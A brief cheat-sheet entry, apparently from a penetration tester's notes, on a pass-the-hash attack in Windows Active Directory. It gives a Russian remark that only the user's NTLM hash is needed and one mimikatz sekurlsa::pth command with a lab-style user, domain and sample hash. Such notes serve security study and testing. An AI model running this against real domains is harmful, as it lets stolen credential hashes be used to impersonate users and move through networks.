#windows #AD #attacks 

> Нужен только NTLM хэш пользователя

```mimikatz
sekurlsa::pth /user:abelkin /domain:testlab.esc /ntlm:e45a314c664d40a227f9540121d1a29d
```